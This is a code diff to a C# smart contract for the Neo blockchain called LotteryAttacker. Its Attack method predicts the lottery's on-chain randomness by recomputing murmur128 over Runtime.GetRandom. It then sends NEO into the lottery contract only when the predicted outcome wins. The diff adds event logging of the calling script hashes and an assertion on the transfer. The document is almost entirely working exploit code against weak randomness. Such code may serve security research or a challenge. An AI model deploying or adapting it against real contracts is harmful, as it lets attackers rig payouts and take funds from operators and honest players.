@@ -16,20 +16,29 @@ namespace Lottery
     [ManifestExtra("Description", "This is a LotteryAttacker")]
     public class LotteryAttacker : SmartContract
     {
+
         [InitialValue("NQpRgzN6TVoJ7MMTVsHzvvrfidgjtJNEdo", ContractParameterType.Hash160)]
         private static readonly UInt160 Lottery = default;
+
+        [DisplayName("Entry")]
+        public static event EntryEvent onEntry;
+        public delegate void EntryEvent(UInt160 entry);
         
         public static void OnNEP17Payment(UInt160 from, BigInteger amount, object data)
         {
         }
         public static int Attack() {
+            onEntry(Runtime.EntryScriptHash);
+            onEntry(Runtime.CallingScriptHash);
+
             BigInteger rand = Runtime.GetRandom();
             for (int i = 0; i < 10; i++) {
                 byte[] nextrand = murmur128(rand.ToByteArray(), Runtime.GetNetwork());
                 if ((new BigInteger(nextrand)) % 2 == 1) {
-                    NEO.Transfer(Runtime.ExecutingScriptHash, Lottery, 1, null);
-                    return (int)(new BigInteger(nextrand));
+                    ExecutionEngine.Assert(NEO.Transfer(Runtime.ExecutingScriptHash, Lottery, 1, null));
+                    return i;
                 }
+                rand = Runtime.GetRandom();
             }
             return 0;
         }
